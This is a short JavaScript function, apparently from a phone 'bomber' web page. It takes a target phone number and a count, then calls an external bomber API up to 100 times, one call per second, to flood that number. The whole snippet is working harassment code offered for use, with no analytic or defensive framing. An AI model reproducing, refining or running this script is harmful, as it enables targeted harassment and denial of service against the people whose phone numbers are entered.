        async function sendRequests() {
            let phone = document.getElementById("phone").value;
            let amount = parseInt(document.getElementById("amount").value);
            let statusDiv = document.getElementById("status");

            if (!phone || isNaN(amount) || amount <= 0) {
                alert("Please enter a valid phone number and amount!");
                return;
            }

            if (amount > 100) {
                alert("Maximum limit is 100 requests. Setting it to 100.");
                amount = 100;
                document.getElementById("amount").value = 100;
            }

            statusDiv.innerHTML = `<p>⚡ Sending ${amount} requests...</p>`;
            
            for (let i = 0; i < amount; i++) {
                await fetch(`https://bomber-lyart.vercel.app/api/free-palestine?phone=${phone}`)
                .catch(error => console.error("Request Failed:", error));

                await new Promise(resolve => setTimeout(resolve, 1000));
            }

            statusDiv.innerHTML = `<p>✅ All ${amount} requests sent!</p>`;
        }
